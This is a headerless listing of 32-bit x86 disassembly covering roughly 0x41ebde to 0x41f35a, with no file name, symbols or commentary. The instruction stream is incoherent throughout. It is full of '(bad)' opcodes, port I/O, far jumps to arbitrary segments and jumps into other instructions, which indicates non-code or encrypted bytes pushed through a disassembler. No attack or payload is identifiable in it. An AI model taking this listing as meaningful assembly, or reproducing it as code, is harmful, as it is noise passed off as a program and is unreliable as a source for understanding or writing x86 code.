  41ebde:	fst    QWORD PTR [ebp-0x716abb8b]
  41ebe4:	test   BYTE PTR [edi],ah
  41ebe6:	aaa    
  41ebe7:	pop    ebp
  41ebe8:	sbb    al,BYTE PTR [esi-0x6b20744a]
  41ebee:	inc    ebp
  41ebef:	in     al,dx
  41ebf0:	jmp    0x41ec32
  41ebf2:	jg     0x41ec72
  41ebf4:	push   DWORD PTR [esi+0x588fac11]
  41ebfa:	sub    al,0xa5
  41ebfc:	and    BYTE PTR [eax],bl
  41ebfe:	cmp    al,0x84
  41ec00:	mov    BYTE PTR [ebx],bl
  41ec02:	xchg   edx,eax
  41ec03:	pop    ecx
  41ec04:	fmul   DWORD PTR [eax]
  41ec06:	dec    eax
  41ec07:	mov    BYTE PTR [edx],al
  41ec09:	stc    
  41ec0a:	retf   
  41ec0b:	inc    eax
  41ec0c:	dec    ecx
  41ec0d:	test   DWORD PTR [esi+ecx*4-0x6a],edx
  41ec11:	nop
  41ec12:	pop    ds
  41ec13:	xor    eax,0x969297eb
  41ec18:	cs lock push 0x78fc9ea
  41ec1f:	cli    
  41ec20:	stos   BYTE PTR es:[edi],al
  41ec21:	in     al,dx
  41ec22:	push   ebp
  41ec23:	std    
  41ec24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec25:	or     DWORD PTR [eax+0x6aee7862],edx
  41ec2b:	ret    
  41ec2c:	loop   0x41ec8e
  41ec2e:	pop    ebx
  41ec2f:	out    0xc7,eax
  41ec31:	mov    DWORD PTR [esi+edi*8-0x31],ecx
  41ec35:	mov    bl,0x9e
  41ec37:	bound  eax,QWORD PTR [eax+0x4e]
  41ec3a:	add    bh,bh
  41ec3c:	push   edi
  41ec3d:	ins    DWORD PTR es:[edi],dx
  41ec3e:	mov    DWORD PTR ds:0xefc709dd,0xac6c4349
  41ec48:	ja     0x41ebfb
  41ec4a:	xchg   ebx,eax
  41ec4b:	xor    esp,edi
  41ec4d:	mov    dh,ah
  41ec4f:	mov    cl,0x28
  41ec51:	es push cs
  41ec53:	pop    eax
  41ec54:	adc    ebx,ecx
  41ec56:	adc    DWORD PTR [edx-0x722ffac7],edx
  41ec5c:	iret   
  41ec5d:	pop    esp
  41ec5e:	ss loope 0x41ec86
  41ec61:	xor    BYTE PTR [edi+0x49],dh
  41ec64:	pop    ebx
  41ec65:	cli    
  41ec66:	aam    0x9e
  41ec68:	mov    ebx,0x8e18f0fb
  41ec6d:	xchg   BYTE PTR [ecx-0x1a782e3d],bh
  41ec73:	sbb    eax,0xc604ebf4
  41ec78:	pusha  
  41ec79:	sbb    edx,DWORD PTR [ebp+0x1b]
  41ec7c:	and    eax,0x872b271d
  41ec81:	mov    DWORD PTR [ebx],ebp
  41ec83:	stc    
  41ec84:	shl    esi,1
  41ec86:	lods   al,BYTE PTR ds:[esi]
  41ec87:	mov    al,0xd0
  41ec89:	enter  0x8ad2,0xff
  41ec8d:	imul   esi,edx,0xffffffb2
  41ec90:	sbb    al,0x62
  41ec92:	jmp    0x6617:0xe6f76eaa
  41ec99:	(bad)  
  41ec9b:	mov    ds:0x7ff59b24,eax
  41eca0:	dec    edx
  41eca1:	sti    
  41eca2:	pop    esi
  41eca3:	cwde   
  41eca4:	sbb    eax,0x432adfd9
  41eca9:	sbb    al,0x28
  41ecab:	pushf  
  41ecac:	retf   
  41ecad:	outs   dx,DWORD PTR ds:[esi]
  41ecae:	push   esi
  41ecaf:	and    BYTE PTR [esp+ebp*8],al
  41ecb2:	sbb    BYTE PTR [ebx+0x12],ah
  41ecb5:	clc    
  41ecb6:	mov    ebp,0x4b3c676a
  41ecbb:	(bad)  
  41ecbc:	jmp    0x41ec55
  41ecbe:	jl     0x41ec70
  41ecc0:	stos   BYTE PTR es:[edi],al
  41ecc1:	dec    ebp
  41ecc2:	(bad)  
  41ecc3:	push   ss
  41ecc4:	daa    
  41ecc5:	mov    dh,0x6a
  41ecc7:	pop    es
  41ecc8:	cdq    
  41ecc9:	adc    DWORD PTR [ebx*8+0x431e1a46],0xa1f4428f
  41ecd4:	in     eax,dx
  41ecd5:	(bad)  
  41ecd6:	popa   
  41ecd7:	call   0x86b1:0x43c67487
  41ecde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecdf:	dec    eax
  41ece0:	add    al,0x5
  41ece2:	xchg   ebx,eax
  41ece3:	or     BYTE PTR [ecx],ch
  41ece5:	inc    esi
  41ece6:	lds    edx,FWORD PTR [edx-0x2a18d609]
  41ecec:	ror    DWORD PTR [edx+0x4e],0xe0
  41ecf0:	outs   dx,DWORD PTR ds:[esi]
  41ecf1:	out    dx,eax
  41ecf2:	push   edx
  41ecf3:	inc    ebp
  41ecf4:	jg     0x41ec97
  41ecf6:	loope  0x41ed64
  41ecf8:	out    dx,eax
  41ecf9:	scas   eax,DWORD PTR es:[edi]
  41ecfa:	sti    
  41ecfb:	std    
  41ecfc:	cld    
  41ecfd:	mov    al,es:0x9371d1b8
  41ed03:	sbb    eax,0xdd999549
  41ed08:	retf   
  41ed09:	js     0x41ed0d
  41ed0b:	(bad)  
  41ed0c:	jmp    0x1b395ded
  41ed11:	je     0x41ed3a
  41ed13:	jmp    0x2d4c:0xcbe440d8
  41ed1a:	push   eax
  41ed1b:	inc    eax
  41ed1c:	cmp    DWORD PTR [ecx],ebx
  41ed1e:	or     DWORD PTR [ecx+0x6f],edi
  41ed21:	add    ecx,ebp
  41ed23:	inc    esi
  41ed24:	ja     0x41ecf6
  41ed26:	xchg   esi,eax
  41ed27:	out    0x9f,eax
  41ed29:	lds    eax,FWORD PTR [edx]
  41ed2b:	ins    DWORD PTR es:[edi],dx
  41ed2c:	fdivr  st,st(6)
  41ed2e:	retf   
  41ed2f:	call   0xc4840d0
  41ed34:	shr    bl,cl
  41ed36:	addr16 int 0x37
  41ed39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed3a:	or     ah,BYTE PTR [edi+0x7f]
  41ed3d:	cs inc esi
  41ed3f:	sbb    dl,bh
  41ed41:	data16 std 
  41ed43:	xchg   ecx,eax
  41ed44:	lea    ecx,[edi]
  41ed46:	loope  0x41edb1
  41ed48:	sbb    al,0xbd
  41ed4a:	ja     0x41ece5
  41ed4c:	loope  0x41ed7f
  41ed4e:	xchg   edi,eax
  41ed4f:	repz neg BYTE PTR [ebx]
  41ed52:	mov    esp,0x6ecadd3e
  41ed57:	fwait
  41ed58:	jnp    0x41ed11
  41ed5a:	fnstsw WORD PTR ds:0x666d65f8
  41ed60:	cld    
  41ed61:	pusha  
  41ed62:	jl     0x41edd7
  41ed64:	inc    esp
  41ed65:	add    al,0xa3
  41ed67:	fadd   st(6),st
  41ed69:	inc    esi
  41ed6a:	dec    edx
  41ed6b:	pusha  
  41ed6c:	or     bl,bl
  41ed6e:	adc    BYTE PTR [eax],al
  41ed70:	retf   
  41ed71:	sub    BYTE PTR [ebp+0x5b1914bb],cl
  41ed77:	out    0x5b,eax
  41ed79:	sbb    ah,BYTE PTR [edx+eiz*1]
  41ed7c:	push   0x1c3060ae
  41ed81:	div    DWORD PTR [edx]
  41ed83:	imul   edx,DWORD PTR [ebx-0x1b933f0a],0x27
  41ed8a:	cmp    BYTE PTR [edx+0x142030c8],ah
  41ed90:	sub    ebx,DWORD PTR [edx]
  41ed92:	inc    edi
  41ed93:	dec    edi
  41ed94:	xchg   BYTE PTR [esi+0x53],bh
  41ed97:	fdiv   DWORD PTR [edi+0x69c00e18]
  41ed9d:	sahf   
  41ed9e:	or     eax,0xe26d68e6
  41eda3:	test   BYTE PTR [ecx-0x43],al
  41eda6:	dec    edi
  41eda7:	cmp    esi,DWORD PTR [edx]
  41eda9:	popf   
  41edaa:	ja     0x41ede5
  41edac:	sub    bl,BYTE PTR [ebp-0x77]
  41edaf:	pop    esp
  41edb0:	aas    
  41edb1:	loope  0x41ed44
  41edb3:	pop    ss
  41edb4:	jl     0x41ed3b
  41edb6:	cli    
  41edb7:	mov    DWORD PTR [esi-0x71],ebp
  41edba:	ins    DWORD PTR es:[edi],dx
  41edbb:	inc    ecx
  41edbc:	sub    eax,0x647a7398
  41edc1:	or     al,BYTE PTR [ebp+0x2c]
  41edc4:	mov    al,0xbb
  41edc6:	ffree  st(4)
  41edc8:	pop    ebp
  41edc9:	push   0xffffffc9
  41edcb:	cmp    al,0x24
  41edcd:	outs   dx,BYTE PTR ds:[esi]
  41edce:	push   esi
  41edcf:	addr16 inc esi
  41edd1:	mov    edx,0x1c0cc404
  41edd6:	or     BYTE PTR [esi],0x77
  41edd9:	fnstsw WORD PTR [bx]
  41eddc:	or     ch,BYTE PTR [esi]
  41edde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eddf:	mov    al,0xc7
  41ede1:	jno    0x41edf7
  41ede3:	fldenv ds:0x5611f001
  41ede9:	sub    eax,0x8783b363
  41edee:	adc    BYTE PTR [ecx],0xf0
  41edf1:	jne    0x41edfe
  41edf3:	add    esp,0x8609b655
  41edf9:	test   eax,0x4821bd2a
  41edfe:	(bad)  
  41edff:	jno    0x41ed81
  41ee01:	add    edx,ecx
  41ee03:	jmp    0x405b1c22
  41ee08:	mov    ah,0xc2
  41ee0a:	xchg   ecx,eax
  41ee0b:	sahf   
  41ee0c:	cmp    BYTE PTR [ebx+0x49df129c],bl
  41ee12:	stc    
  41ee13:	lahf   
  41ee14:	mov    BYTE PTR [edx],bh
  41ee16:	or     bh,dh
  41ee18:	lahf   
  41ee19:	inc    ecx
  41ee1a:	xchg   BYTE PTR ds:0xa0826333,bh
  41ee20:	call   0x684ad48e
  41ee25:	icebp  
  41ee26:	jmp    0x2c5d177e
  41ee2b:	push   edi
  41ee2c:	mov    eax,0xb7216715
  41ee31:	in     eax,0x39
  41ee33:	xchg   esi,eax
  41ee34:	(bad)  
  41ee35:	adc    edx,DWORD PTR [eax-0x5b5a5c1c]
  41ee3b:	(bad)  
  41ee3c:	std    
  41ee3d:	mov    al,0x9a
  41ee3f:	mov    edx,0x41e3f472
  41ee44:	xor    ecx,ebp
  41ee46:	inc    DWORD PTR [esi+0x30c18626]
  41ee4c:	and    eax,0x271ce984
  41ee51:	shr    bh,1
  41ee53:	lahf   
  41ee54:	or     DWORD PTR [eax+ebp*2+0x1d172bc6],edi
  41ee5b:	add    eax,0x41c96505
  41ee60:	add    esi,DWORD PTR [edx+eax*4-0x73]
  41ee64:	fwait
  41ee65:	push   ecx
  41ee66:	or     BYTE PTR [esi-0x76],bh
  41ee69:	int3   
  41ee6a:	data16 mov bl,0x95
  41ee6d:	stos   DWORD PTR es:[edi],eax
  41ee6e:	mov    dl,0x16
  41ee70:	pusha  
  41ee71:	dec    edx
  41ee72:	adc    al,0x32
  41ee74:	mov    dl,0x7
  41ee76:	mov    ds:0xbab12461,al
  41ee7b:	pop    ebx
  41ee7d:	adc    dl,BYTE PTR ds:0x52e2820b
  41ee83:	aam    0xe0
  41ee85:	xor    dh,ah
  41ee87:	jle    0x41ee5a
  41ee89:	jp     0x41ee6f
  41ee8b:	add    eax,0xff804423
  41ee90:	jle    0x41eea6
  41ee92:	sub    al,0x95
  41ee94:	ss rcr ah,0xc9
  41ee98:	je     0x41eedb
  41ee9a:	stos   DWORD PTR es:[edi],eax
  41ee9b:	push   0x64ef6bfa
  41eea0:	es arpl si,di
  41eea3:	stos   BYTE PTR es:[edi],al
  41eea4:	push   DWORD PTR [edx+ebx*4]
  41eea7:	and    DWORD PTR [eax-0x1296ea7],ecx
  41eead:	mov    ecx,0xa886e59c
  41eeb2:	add    DWORD PTR [edx+edi*2-0x2f],ebp
  41eeb6:	ret    
  41eeb7:	add    dl,BYTE PTR [ecx]
  41eeb9:	imul   edi,eax,0xaebf89ad
  41eebf:	mov    esi,0xc2ee0000
  41eec4:	popf   
  41eec5:	sub    eax,0xc3fe7fbd
  41eeca:	aas    
  41eecb:	out    dx,eax
  41eecc:	mov    edi,0xf8238d37
  41eed1:	outs   dx,BYTE PTR ds:[esi]
  41eed2:	push   es
  41eed3:	add    DWORD PTR gs:[eax],eax
  41eed6:	add    eax,DWORD PTR es:[eax]
  41eed9:	add    BYTE PTR [edi+eiz*1],dl
  41eedc:	repnz xor al,0xca
  41eedf:	fmul   DWORD PTR [ecx]
  41eee1:	sub    ebp,ecx
  41eee3:	out    dx,eax
  41eee4:	xor    eax,0x3a6a0330
  41eee9:	cwde   
  41eeea:	dec    esp
  41eeeb:	repnz mov ch,0x46
  41eeee:	mov    DWORD PTR [eax-0x2a9587f8],ecx
  41eef4:	call   0xf7fe:0x9098e327
  41eefb:	mov    bh,0xc4
  41eefd:	add    eax,0x885dff91
  41ef02:	rcl    esi,cl
  41ef04:	(bad)  
  41ef05:	lods   al,BYTE PTR ds:[esi]
  41ef06:	ss xchg ecx,eax
  41ef08:	push   cs
  41ef09:	add    BYTE PTR [eax+0x68812d64],0x3e
  41ef10:	and    BYTE PTR [ecx+0x4],ch
  41ef13:	aam    0x4d
  41ef15:	push   ebx
  41ef16:	push   ss
  41ef17:	dec    esi
  41ef18:	jg     0x41ef69
  41ef1a:	xchg   ecx,eax
  41ef1b:	push   0x48
  41ef1d:	ror    BYTE PTR [edx+edi*8],0xd8
  41ef21:	mov    al,0xb4
  41ef23:	cmp    dl,bl
  41ef25:	aad    0xb4
  41ef27:	fmul   DWORD PTR fs:0x12bb45e3
  41ef2e:	mov    dl,0xb9
  41ef30:	cs ins DWORD PTR es:[edi],dx
  41ef32:	mov    eax,ds:0x385c17cd
  41ef37:	icebp  
  41ef38:	daa    
  41ef39:	jmp    0xc251bc55
  41ef3e:	add    edx,ebp
  41ef40:	aas    
  41ef41:	das    
  41ef42:	push   0x6b
  41ef44:	rcr    DWORD PTR [ebp+esi*2+0x48],0x30
  41ef49:	mov    ecx,DWORD PTR [esi+ebx*8-0x7c]
  41ef4d:	mov    WORD PTR [ebp-0x33],fs
  41ef50:	enter  0xd855,0xce
  41ef54:	or     BYTE PTR [edx-0x58],0x93
  41ef58:	gs jbe 0x41efb5
  41ef5b:	mov    edx,0x5413fed2
  41ef60:	add    DWORD PTR [ebx-0x3c23bb8a],ebp
  41ef66:	shr    BYTE PTR [esi+0x7d085da],0x20
  41ef6d:	(bad)  
  41ef6e:	into   
  41ef6f:	lock adc ecx,DWORD PTR [edx]
  41ef72:	xchg   edi,eax
  41ef73:	pop    edi
  41ef74:	jle    0x41ef0c
  41ef76:	push   ecx
  41ef77:	icebp  
  41ef78:	inc    ebx
  41ef79:	dec    edi
  41ef7a:	cmp    al,0x76
  41ef7c:	loope  0x41ef24
  41ef7e:	push   es
  41ef7f:	je     0x41efbe
  41ef81:	loop   0x41ef9a
  41ef83:	stc    
  41ef84:	dec    edx
  41ef85:	xor    eax,0xe128f1c8
  41ef8a:	arpl   dx,dx
  41ef8c:	pop    ebx
  41ef8d:	mov    ch,0xd8
  41ef8f:	dec    ebx
  41ef90:	push   ebp
  41ef91:	aaa    
  41ef92:	pop    esp
  41ef93:	addr16 mov cl,0x1c
  41ef96:	cmp    DWORD PTR [edx+0x5481a10a],edi
  41ef9c:	dec    edx
  41ef9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef9e:	jbe    0x41efc2
  41efa0:	ds or  al,0xfc
  41efa3:	and    al,BYTE PTR [eax]
  41efa5:	xor    BYTE PTR [ecx-0x19a6831b],0xc6
  41efac:	call   FWORD PTR [edi+0x11]
  41efaf:	jns    0x41ef37
  41efb1:	push   esp
  41efb2:	or     eax,0xe3b97b68
  41efb7:	push   0x4a
  41efb9:	mov    edx,gs
  41efbb:	push   ecx
  41efbc:	push   cs
  41efbd:	loope  0x41eff3
  41efbf:	arpl   cx,bp
  41efc1:	mov    ebp,0xb0278c97
  41efc6:	cmp    dl,dl
  41efc8:	pusha  
  41efc9:	les    ebp,FWORD PTR [edi]
  41efcb:	jbe    0x41f020
  41efcd:	inc    DWORD PTR [edx+0xae1dd7c]
  41efd3:	cli    
  41efd4:	sbb    eax,0xce615352
  41efd9:	push   ecx
  41efda:	pushf  
  41efdb:	push   edx
  41efdc:	xor    ch,BYTE PTR [eax-0x6474c983]
  41efe2:	cmp    BYTE PTR ds:0x29a51f46,ch
  41efe8:	mov    al,0xfb
  41efea:	push   eax
  41efeb:	pop    ds
  41efec:	je     0x41f046
  41efee:	jl     0x41efc6
  41eff0:	icebp  
  41eff1:	outs   dx,DWORD PTR ds:[esi]
  41eff2:	mov    al,0x38
  41eff4:	das    
  41eff5:	outs   dx,DWORD PTR ds:[esi]
  41eff6:	cld    
  41eff7:	fsubr  DWORD PTR [esi-0x46]
  41effa:	xchg   ah,bh
  41effc:	in     eax,dx
  41effd:	not    DWORD PTR [esi]
  41efff:	loopne 0x41ef99
  41f001:	outs   dx,DWORD PTR ds:[esi]
  41f002:	cld    
  41f003:	and    eax,0x33626cf3
  41f008:	aam    0x97
  41f00a:	test   ebp,ebp
  41f00c:	sbb    esp,DWORD PTR [edi+0x24]
  41f00f:	mov    al,0x57
  41f011:	xor    BYTE PTR [edx],bh
  41f013:	sub    eax,0x7168272
  41f018:	jmp    0x5b4f0067
  41f01d:	cmp    edx,DWORD PTR [ebx-0x7c05fad0]
  41f023:	cmc    
  41f024:	in     al,0x25
  41f026:	dec    ecx
  41f027:	aam    0xf8
  41f029:	mov    dl,0xc6
  41f02b:	cld    
  41f02c:	push   ebx
  41f02d:	in     eax,dx
  41f02e:	push   0xa25b361a
  41f033:	fwait
  41f034:	push   0x776c0699
  41f039:	stos   BYTE PTR es:[edi],al
  41f03a:	mov    bl,0x5b
  41f03c:	mov    bh,0x3b
  41f03e:	scas   al,BYTE PTR es:[edi]
  41f03f:	mov    bh,ch
  41f041:	add    esp,DWORD PTR [edx+0x2f3b0a35]
  41f047:	loope  0x41efd2
  41f049:	les    ecx,FWORD PTR [ebp-0x1a]
  41f04c:	popf   
  41f04d:	or     dh,bh
  41f04f:	popf   
  41f050:	inc    ebx
  41f051:	mov    bl,0x9e
  41f053:	adc    edi,DWORD PTR [ebx-0x7311f655]
  41f059:	ret    
  41f05a:	push   DWORD PTR [esp+ecx*4+0xe]
  41f05e:	xor    eax,0xd6259927
  41f063:	arpl   WORD PTR [ebx+0x62079ab1],dx
  41f069:	mov    esi,0x63b207
  41f06e:	cld    
  41f06f:	pop    ds
  41f070:	add    eax,0x6f3583e9
  41f075:	inc    edx
  41f076:	ds adc eax,0x12a939f5
  41f07c:	dec    edx
  41f07d:	mov    BYTE PTR [eax-0x5f],dh
  41f080:	ret    0xfb88
  41f083:	add    eax,0x239284c1
  41f088:	push   edi
  41f089:	popa   
  41f08a:	out    0x7f,al
  41f08c:	inc    edi
  41f08d:	push   edx
  41f08e:	jmp    0x20dd2b
  41f093:	pop    ebp
  41f094:	cs jl  0x41f074
  41f097:	push   0xbbecc992
  41f09c:	or     eax,0xe8b86a26
  41f0a1:	sub    ch,BYTE PTR es:[ebx-0x3708dbef]
  41f0a8:	addr16 mov al,ds:0x1850
  41f0ac:	mov    bl,0xdd
  41f0ae:	ret    
  41f0af:	and    ah,BYTE PTR [edx+eax*4]
  41f0b2:	push   esi
  41f0b3:	mov    al,ds:0xf2e65e38
  41f0b8:	add    DWORD PTR [esi],ebx
  41f0ba:	sub    al,0x73
  41f0bc:	inc    edx
  41f0bd:	sar    DWORD PTR [ebx-0x34],0xf8
  41f0c1:	sbb    ebp,esi
  41f0c3:	inc    ecx
  41f0c4:	gs mov esi,0xe0410193
  41f0ca:	cmp    edi,ebx
  41f0cc:	leave  
  41f0cd:	nop
  41f0ce:	adc    eax,0x25c030d5
  41f0d3:	xor    DWORD PTR [eax+0x4c279fa],0x42
  41f0da:	stos   DWORD PTR es:[edi],eax
  41f0db:	div    BYTE PTR [esi]
  41f0dd:	xor    al,0x78
  41f0df:	push   ecx
  41f0e0:	in     eax,0xb2
  41f0e2:	jge    0x41f0d2
  41f0e4:	cmp    esp,DWORD PTR [esi-0x70]
  41f0e7:	aas    
  41f0e8:	pop    esp
  41f0e9:	cmp    dl,BYTE PTR [ebx-0x3fab95e7]
  41f0ef:	mov    ebx,DWORD PTR [edi+0x5da6b124]
  41f0f5:	stos   DWORD PTR es:[edi],eax
  41f0f6:	mov    esi,0xea8a62f1
  41f0fb:	sbb    DWORD PTR [edi+edx*4-0x5f],ebx
  41f0ff:	mov    edi,0x2884c955
  41f104:	test   al,0x3f
  41f106:	retf   
  41f107:	xchg   ebx,eax
  41f108:	sub    eax,0x4a3b908c
  41f10d:	outs   dx,BYTE PTR ds:[esi]
  41f10e:	in     al,0x3f
  41f110:	jg     0x41f173
  41f112:	pop    ecx
  41f113:	mov    ch,0x8a
  41f115:	repz jg 0x41f191
  41f118:	jge    0x41f0d1
  41f11a:	sar    esi,0xec
  41f11d:	mov    bl,0x5a
  41f11f:	outs   dx,DWORD PTR ds:[esi]
  41f120:	jg     0x41f10a
  41f122:	xchg   esp,eax
  41f123:	scas   eax,DWORD PTR es:[edi]
  41f124:	aad    0xde
  41f126:	loope  0x41f1a2
  41f128:	add    DWORD PTR [edx+0x105d18e0],esi
  41f12e:	aas    
  41f12f:	xchg   DWORD PTR [edi],edx
  41f131:	(bad)  
  41f132:	push   edx
  41f133:	cmp    DWORD PTR [eax+0x36],ecx
  41f136:	jge    0x41f178
  41f138:	test   eax,0xeea61133
  41f13d:	(bad)  
  41f13e:	test   al,0x69
  41f140:	lods   eax,DWORD PTR ds:[esi]
  41f141:	(bad)  
  41f142:	xor    eax,0x169f789f
  41f147:	(bad)  
  41f149:	and    al,0x78
  41f14b:	or     DWORD PTR [ebp-0x9cb1632],esi
  41f151:	into   
  41f152:	or     BYTE PTR [edx+0x69],cl
  41f155:	jb     0x41f190
  41f157:	rol    DWORD PTR [di+0x29b9],0x8f
  41f15d:	or     eax,0x6548e731
  41f162:	outs   dx,BYTE PTR ds:[esi]
  41f163:	sti    
  41f164:	fwait
  41f165:	adc    eax,0xaa6959f9
  41f16a:	sbb    BYTE PTR [ebp-0x77],ah
  41f16d:	(bad)  
  41f16e:	sub    DWORD PTR ds:0xe9e012f0,ebp
  41f174:	jnp    0x41f1d5
  41f176:	xor    al,0x20
  41f178:	jbe    0x41f122
  41f17a:	xchg   BYTE PTR [edx-0x13d4b8a7],cl
  41f180:	outs   dx,DWORD PTR ds:[esi]
  41f181:	scas   eax,DWORD PTR es:[edi]
  41f182:	hlt    
  41f183:	inc    eax
  41f184:	adc    eax,0x2a37131b
  41f189:	cs pushf 
  41f18b:	mov    DWORD PTR [edi+esi*1-0x7c9e7a5d],eax
  41f192:	xchg   esp,eax
  41f193:	retf   0x2a3b
  41f196:	mov    dl,al
  41f198:	adc    esi,eax
  41f19a:	bound  ebx,QWORD PTR [eax+0x70]
  41f19d:	jns    0x41f1c4
  41f19f:	lahf   
  41f1a0:	iret   
  41f1a1:	mov    ds:0x96a3ddf3,al
  41f1a6:	add    DWORD PTR [esi+0x593b4528],0x1686d789
  41f1b0:	cmp    cl,BYTE PTR [ebx+0x308be044]
  41f1b6:	data16 mov dh,dh
  41f1b9:	aaa    
  41f1ba:	aad    0xf8
  41f1bc:	push   0x41dd0ed9
  41f1c1:	jmp    0x41f21f
  41f1c3:	jnp    0x41f148
  41f1c5:	iret   
  41f1c6:	call   0x231f0d0c
  41f1cb:	add    BYTE PTR [edx],ah
  41f1cd:	mov    bl,BYTE PTR [edx*4+0x66058d64]
  41f1d4:	jnp    0x41f1b7
  41f1d6:	jecxz  0x41f1e3
  41f1d8:	pop    ds
  41f1d9:	shl    edi,0x77
  41f1dc:	jne    0x41f244
  41f1de:	daa    
  41f1df:	shl    ebp,cl
  41f1e1:	nop
  41f1e2:	je     0x41f20d
  41f1e4:	ss loop 0x41f213
  41f1e7:	and    eax,0xd98dc9b1
  41f1ec:	mov    edx,0x1a5f5518
  41f1f1:	push   ds
  41f1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f3:	pushf  
  41f1f4:	cmp    al,0xb5
  41f1f6:	and    ch,BYTE PTR [ecx]
  41f1f8:	mov    ecx,DWORD PTR [ebx-0x436a9196]
  41f1fe:	cmc    
  41f1ff:	xchg   esp,eax
  41f200:	add    BYTE PTR [eax],al
  41f202:	push   ebx
  41f203:	(bad)  
  41f204:	(bad)  
  41f205:	push   esi
  41f206:	(bad)  
  41f207:	jle    0x41f204
  41f209:	xlat   BYTE PTR ds:[ebx]
  41f20a:	outs   dx,DWORD PTR ds:[esi]
  41f20b:	mov    ah,0x77
  41f20d:	call   0x682c:0x90cd100f
  41f214:	add    DWORD PTR [eax],eax
  41f216:	add    eax,DWORD PTR es:[eax]
  41f219:	add    BYTE PTR [edi-0xe63f687],dh
  41f21f:	sub    eax,0xafb83db4
  41f224:	sahf   
  41f225:	pushf  
  41f226:	mov    WORD PTR [ebp+0x3bf95cea],?
  41f22c:	jge    0x41f2a7
  41f22e:	dec    esp
  41f22f:	adc    edi,DWORD PTR [esi-0x48b350af]
  41f235:	lods   al,BYTE PTR ds:[esi]
  41f236:	out    dx,eax
  41f237:	and    DWORD PTR [edi+edx*2+0x46],eax
  41f23b:	retf   0xe19d
  41f23e:	jo     0x41f2b7
  41f240:	mov    al,ds:0x4be4f30c
  41f246:	mov    WORD PTR [ecx],?
  41f248:	addr16 pop ss
  41f24a:	jp     0x41f1e1
  41f24c:	or     eax,0x914ff51f
  41f251:	add    al,0xe9
  41f253:	cmp    BYTE PTR [ecx+0x6e],al
  41f256:	ret    0xf8b3
  41f259:	fcom   QWORD PTR [edi+0x24]
  41f25c:	cmp    DWORD PTR [ecx+0x6e],edx
  41f25f:	test   DWORD PTR [edx],esp
  41f261:	in     eax,dx
  41f262:	push   ecx
  41f263:	leave  
  41f264:	inc    esi
  41f265:	cmp    cl,ah
  41f267:	jle    0x41f29e
  41f269:	popf   
  41f26a:	jmp    0x41f246
  41f26c:	mov    ds:0x6873f087,al
  41f271:	retf   0x12b8
  41f274:	sub    DWORD PTR [esi],ebp
  41f276:	inc    esp
  41f277:	test   BYTE PTR [edx],ah
  41f279:	xor    BYTE PTR [ebx+0xa],dl
  41f27c:	das    
  41f27d:	dec    ebp
  41f27e:	xlat   BYTE PTR ds:[ebx]
  41f27f:	adc    al,0xc9
  41f281:	out    dx,eax
  41f282:	xor    al,0xd7
  41f284:	sti    
  41f285:	shr    BYTE PTR [edx-0x2b],1
  41f288:	inc    ebx
  41f289:	sub    esp,DWORD PTR [ecx+0x6b]
  41f28c:	and    bh,BYTE PTR [ecx+0x925ca2]
  41f292:	pop    eax
  41f293:	idiv   BYTE PTR [esi+0x62]
  41f296:	pop    esp
  41f297:	xchg   ebp,eax
  41f298:	dec    edi
  41f299:	and    edi,eax
  41f29b:	fs xor eax,0xf0ef98c3
  41f2a1:	test   BYTE PTR [ebp-0x2b],dl
  41f2a4:	jp     0x41f2c9
  41f2a6:	add    al,0x68
  41f2a8:	jmp    FWORD PTR [ebx-0x16]
  41f2ab:	mov    edi,0xaaf4f167
  41f2b0:	ret    0xc13f
  41f2b3:	push   ebp
  41f2b4:	scas   al,BYTE PTR es:[edi]
  41f2b5:	shr    BYTE PTR [edx+0x12],cl
  41f2b8:	push   ss
  41f2b9:	push   0xfffffff3
  41f2bb:	sub    dh,BYTE PTR [ebp-0x145eab94]
  41f2c1:	xor    esi,edi
  41f2c3:	sub    BYTE PTR [ebx+0x1f78d369],ch
  41f2c9:	shl    BYTE PTR [edx-0x14fb749f],1
  41f2cf:	xor    BYTE PTR ds:0xf044aae5,ah
  41f2d5:	push   esp
  41f2d6:	inc    ebp
  41f2d7:	out    dx,al
  41f2d8:	sub    bh,BYTE PTR [edi]
  41f2da:	lea    ebx,[esi+0x4b4cc39d]
  41f2e0:	fwait
  41f2e1:	jecxz  0x41f325
  41f2e3:	shl    bh,0x87
  41f2e6:	inc    eax
  41f2e7:	(bad)  
  41f2e8:	push   edi
  41f2e9:	dec    edi
  41f2ea:	dec    esi
  41f2eb:	outs   dx,DWORD PTR ds:[esi]
  41f2ec:	loopne 0x41f2f0
  41f2ee:	aam    0x5c
  41f2f0:	or     BYTE PTR gs:[ebp+0x7a],0x67
  41f2f5:	add    DWORD PTR [esi],esp
  41f2f7:	stos   DWORD PTR es:[edi],eax
  41f2f8:	addr16 test eax,0x36d64330
  41f2fe:	jo     0x41f30d
  41f300:	jmp    0x41f343
  41f302:	push   edi
  41f303:	inc    DWORD PTR [edx]
  41f305:	dec    edi
  41f306:	int    0x17
  41f308:	fincstp 
  41f30a:	sbb    BYTE PTR [ebx-0x554768dc],ah
  41f310:	inc    edx
  41f311:	mov    ah,0x44
  41f313:	cmc    
  41f314:	xlat   BYTE PTR ds:[ebx]
  41f315:	fcomp  QWORD PTR [edi-0x67]
  41f318:	cmp    BYTE PTR [edi-0x44c98656],0xe6
  41f31f:	pop    ds
  41f320:	dec    edi
  41f321:	xchg   edx,eax
  41f322:	add    al,0xf8
  41f324:	sbb    ch,bh
  41f326:	jge    0x41f2c5
  41f328:	inc    ebp
  41f329:	pop    ss
  41f32a:	fisttp QWORD PTR [ecx-0x32]
  41f32d:	jge    0x41f2c0
  41f32f:	fcmovne st,st(2)
  41f331:	loop   0x41f380
  41f333:	lds    edx,FWORD PTR [edi+0x0]
  41f336:	cmp    eax,0x52a2efca
  41f33b:	ins    DWORD PTR es:[edi],dx
  41f33c:	or     dh,BYTE PTR [esi-0x36]
  41f33f:	daa    
  41f340:	inc    esi
  41f341:	mov    esi,0xb729b49a
  41f346:	xchg   edi,eax
  41f347:	test   BYTE PTR [ebx],0x41
  41f34a:	shl    BYTE PTR [edi-0xca3b40d],1
  41f350:	xor    al,0x34
  41f352:	cdq    
  41f353:	xor    al,cl
  41f355:	mov    esi,0x9bdf6b7
  41f35a:	mov    bh,0x81
